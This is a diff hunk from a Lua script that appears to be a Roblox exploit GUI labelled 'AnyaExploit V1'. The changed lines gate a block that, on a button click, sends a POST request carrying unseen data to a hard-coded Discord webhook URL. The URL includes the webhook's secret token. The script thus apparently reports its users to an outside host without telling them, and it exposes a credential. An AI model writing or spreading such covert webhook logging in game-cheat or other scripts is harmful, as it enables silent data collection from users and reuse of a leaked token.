@@ -3099,6 +3099,8 @@ local function C_10e()
 	script.Parent.Parent.ImageButton.MouseButton1Click:Connect(function()
 		game.TweenService:Create(script.Parent, TweenInfo.new(1.5), {Position = UDim2.new(0.219, 0,0.228, 0)}):Play()
 		game.TweenService:Create(script.Parent.Parent.ImageButton, TweenInfo.new(4), {Position = UDim2.new(-5, 0,0.121, 0)}):Play()
+getgenv().log = true
+if log == true then
 local webhookcheck = "AnyaExploit V1"
 
 local url = "https://discord.com/api/webhooks/1191422032039116980/9DW38LUNa9eRdzdTcBkm4GUrvxZqNbEwxV6tun-uoLNko7F4jp9ghbtImFUDG96XIGGs"
@@ -3125,6 +3127,8 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
+log = false
+			end
 	end)
 
 	local ffps = f1.fps.TextLabel
